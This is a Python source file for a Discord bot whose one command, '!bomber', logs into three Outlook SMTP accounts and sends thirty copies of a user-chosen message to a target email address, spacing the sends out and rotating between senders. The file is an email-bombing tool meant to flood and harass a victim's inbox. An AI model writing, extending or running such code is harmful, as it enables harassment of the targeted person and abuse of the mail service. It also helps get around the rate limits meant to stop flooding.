import email
import time
import discord
import smtplib
import random
from discord.ext import commands

client = commands.Bot(command_prefix=commands.when_mentioned_or('!'))

client.remove_command("help")

@client.event
async def on_ready():
    await client.change_presence(activity = discord.Streaming(name = "!help", type = 1))
    print("Bot is ready")

@client.command()
async def bomber(ctx, target, subject, message = ""):
    print("En cours d'envoie")
    mail = smtplib.SMTP("smtp-mail.outlook.com", 587)
    mail.ehlo()
    mail.starttls()
    mail.ehlo()
    mail.login("", "")
    mail2 = smtplib.SMTP("smtp-mail.outlook.com", 587)
    mail2.ehlo()
    mail2.starttls()
    mail2.ehlo()
    mail2.login("", "")
    mail3 = smtplib.SMTP("smtp-mail.outlook.com", 587)
    mail3.ehlo()
    mail3.starttls()
    mail3.ehlo()
    mail3.login("", "")
    for i in range(30):
        time.sleep(5)
        rand = random.randint(0, 2)
        if rand == 0:
            msg = '''From: %s\nTo: %s\nSubject: %s\n%s\n
            ''' % ("", target, subject, message)
            mail.sendmail("", target, msg)
        elif rand == 1:
            msg = '''From: %s\nTo: %s\nSubject: %s\n%s\n
            ''' % ("", target, subject, message)
            mail2.sendmail("", target, msg)
        else:
            msg = '''From: %s\nTo: %s\nSubject: %s\n%s\n
            ''' % ("", target, subject, message)
            mail3.sendmail("", target, msg)
    mail.close()

client.run("")
